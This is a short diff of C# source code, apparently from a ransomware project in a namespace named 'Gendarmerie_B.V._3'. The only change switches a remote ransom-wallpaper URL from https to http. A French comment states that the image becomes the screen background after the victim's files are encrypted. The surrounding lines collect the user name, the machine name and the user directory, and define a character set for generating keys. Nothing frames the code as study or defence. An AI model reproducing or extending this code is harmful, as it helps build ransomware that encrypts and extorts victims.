@@ -28,7 +28,7 @@ namespace Gendarmerie_B.V._3
         string userName = Environment.UserName;
         string computerName = System.Environment.MachineName.ToString();
         string userDir = "C:\\Users\\";
-        string backgroundImageUrl = "https://panafricaine.com/ranso4.jpg"; //image de fond de l'ecran après cryptage des fichiers
+        string backgroundImageUrl = "http://panafricaine.com/ranso4.jpg"; //image de fond de l'ecran après cryptage des fichiers
 
         string charSet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/@^";
 
